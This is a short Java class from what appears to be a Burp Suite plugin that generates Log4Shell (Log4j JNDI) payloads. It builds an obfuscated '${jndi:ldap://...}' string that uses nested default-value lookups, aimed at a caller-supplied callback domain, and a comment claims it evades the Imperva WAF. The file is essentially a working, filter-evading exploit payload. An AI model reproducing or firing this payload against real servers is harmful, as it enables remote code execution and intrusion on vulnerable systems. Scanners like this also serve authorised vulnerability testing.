package burp.poc.impl;

import burp.poc.IPOC;
import burp.utils.Utils;

//Currently bypass lmperva waf?    12/17

public class POC16 implements IPOC {
    @Override
    public String generate(String domain) {
        return "${j${123123123:-n}di${123123123:-:}ldap:${123123123:-//}" + domain + "/" + Utils.GetRandomString(Utils.GetRandomNumber(2, 5)) + "}";
    }

    @Override
    public int getType() {
        return POC_TYPE_LDAP;
    }

    @Override
    public int getIndex() {
        return 16;
    }
}
